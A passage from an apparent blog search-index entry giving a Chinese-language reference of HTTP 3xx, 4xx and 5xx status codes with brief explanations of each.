（多种选择）针对请求，服务器可执行多种操作。服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。如果服务器要提出优先选择，则应该在Location应答头指明。 301 （永久移动）请求的网页已永久移动到新位置。新的URL在Location头中给出，服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。 302 （临时移动）类似于301，但新的URL应该被视为临时性的替代，而不是永久性的。服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。 303 （查看其他位置）类似于301/302，不同之处在于，如果原来的请求是POST，Location头指定的重定向目标文档应该通过GET提取。 304 （未修改）客户端有缓冲的文档并发出了一个条件性的请求（一般是提供If-Modified-Since头表示客户只想比指定日期更新的文档）。自从上次请求后，请求的网页未修改过。服务器告诉客户，原来缓冲的文档还可以继续使用。服务器返回此响应时，不会返回网页内容。 305 （使用代理）客户请求的文档应该通过Location头所指明的代理服务器提取。 307 （临时重定向）和302相同。许多浏览器会错误地响应302应答进行重定向，即使原来的请求是POST，即使它实际上只能在POST请求的应答是303时 才能重定向。由于这个原因，HTTP 1.1新增了307，以便更加清除地区分几个状态代码：当出现303应答时，浏览器可以跟随重定向的GET和POST请求；如果是307应答，则浏览器只 能跟随对GET请求的重定向。（HTTP 1.1新） 4xx：(请求错误)客户端错误，请求包含语法错误或者请求无法实现 400 （错误请求）服务器不理解请求的语法。 401 （未授权）请求要求身份验证。对于需要登录的网页，服务器可能返回此响应。 403 （禁止）资源不可用。服务器理解客户的请求，但拒绝处理它。通常由于服务器上文件或目录的权限设置导致。 404 （未找到）服务器找不到请求的网页。 405 （方法禁用）禁用请求中指定的方法。 406 （不接受）指定的资源已经找到，但它的MIME类型和客户在Accpet头中所指定的不兼容 407 （需要代理授权）此状态代码与 401（未授权）类似，但指定请求者应当授权使用代理。 408 （请求超时） 在服务器许可的等待时间内，客户一直没有发出任何请求。客户可以在以后重复同一请求。 409 （冲突）服务器在完成请求时发生冲突。通常和PUT请求有关。由于请求和资源的当前状态相冲突，因此请求不能成功。服务器必须在响应中包含有关冲突的信息。 410 （已删除）所请求的文档已经不再可用，而且服务器不知道应该重定向到哪一个地址。它和404的不同在于，返回410表示文档永久地离开了指定的位置，而404表示由于未知的原因文档不可用。 411 （需要有效长度）服务器不接受不含有效内容长度标头字段的请求。 412 （未满足前提条件）请求头中指定的一些前提条件失败 413 （请求实体过大）目标文档的大小超过服务器当前愿意处理的大小。如果服务器认为自己能够稍后再处理该请求，则应该提供一个Retry-After头 414 （请求的 URI 过长）请求的 URI（通常为网址）过长，服务器无法处理。 415 （不支持的媒体类型）请求的格式不受请求页面的支持。 416 （请求范围不符合要求）服务器不能满足客户在请求中指定的Range头。 417 （未满足期望值）服务器未满足”期望”请求标头字段的要求。 5xx：(服务器错误)服务器不能实现一种明显无效的请求,这些状态代码表示服务器在尝试处理请求时发生内部错误。这些错误可能是服务器本身的错误，而不是请求出错。 500 （服务器内部错误）服务器遇到错误，无法完成请求。 501 （尚未实施）服务器不具备完成请求的功能。例如，服务器无法识别请求方法时可能会返回此代码。 502 （错误网关）服务器作为网关或代理，从上游服务器收到无效响应。 503 （服务不可用）服务器目前无法使用（由于超载或停机维护）。通常，这只是暂时状态。 504 （网关超时）服务器作为网关或代理，但是没有及时从上游服务器收到请求。 505 （HTTP 版本不受支持）服务器不支持请求中所用的 HTTP 协议版本。]]></content>
      <categories>
        <category>网络基础</category>
      </categories>
  </entry>
</search>
